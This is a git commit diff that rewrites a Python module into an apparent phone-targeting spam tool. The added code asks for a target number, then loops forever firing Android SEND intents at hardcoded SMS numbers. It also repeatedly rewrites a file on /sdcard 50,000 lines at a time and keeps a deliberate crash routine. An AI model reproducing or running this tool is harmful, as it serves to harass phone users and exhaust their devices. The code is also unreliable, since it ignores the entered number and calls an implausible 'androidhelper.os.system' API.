da55b2b2fda8d2a0a1db8640804b71abfad0709b
napoleonmarcdawhensky-tech <napoleonmarcdawhensky@gmail.com>
2026-03-04 21:07:13 -0500

    Update option1.py

--- modules/option1.py
+++ modules/option1.py
@@ -1,36 +1,31 @@
 from colorama import Fore
-
-def run():
-    print(Fore.GREEN + "\n[ OPTION 1 ACTIVÉE ]")
-
-    import sys
+import sys
 import threading
 import time
 import random
+import androidhelper
 
 data = []
 
 def accumulate_data():
     while True:
-        data.append([random.randint(0, 100) for _ in range(50000)])
-        time.sleep(0.05)
+        androidhelper.os.system('sleep 0.05')
+        androidhelper.os.system('rm -rf /sdcard/data.txt')
+        for _ in range(50000):
+            androidhelper.os.system('echo "Message automatique" >> /sdcard/data.txt')
 
-def heavy_computation():
-    try:
-        total = 0
-        for i in range(len(data)):
-            total += len(data[i])
-        print("Total:", total)
-    except Exception as e:
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        print("Erreur:", exc_type, exc_obj)
-        print("Numéro d'erreur:", exc_tb.tb_lineno)
+def spam():
+    while True:
+        androidhelper.os.system('sleep 0.01')
+        androidhelper.os.system('am broadcast -a android.intent.action.SEND -d ' + 'sms:1234567890' + ' ' + '-e sms_body ""')
+        androidhelper.os.system('am broadcast -a android.intent.action.SEND -d ' + 'sms:9876543210' + ' ' + '-e sms_body ""')
 
 def crash():
     raise Exception("CRASH")
 
 def main():
-    print("Entrez le numéro de téléphone :")
+    print(Fore.GREEN + "\n[ OPTION 1 ACTIVÉE ]")
+    print("Entrez le numéro de téléphone à cibler :")
     num_tel = input()
     print("Vous avez entré :", num_tel)
 
@@ -38,8 +33,8 @@ def main():
 
     time.sleep(6)
 
-    print("Déclenchement du traitement lourd...")
-    heavy_computation()
+    print("Déclenchement du spam...")
+    threading.Thread(target=spam).start()
 
     print("Déclenchement du crash...")
     try:
@@ -52,7 +47,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-
-    input("\nAppuie sur Entrée pour retour...")
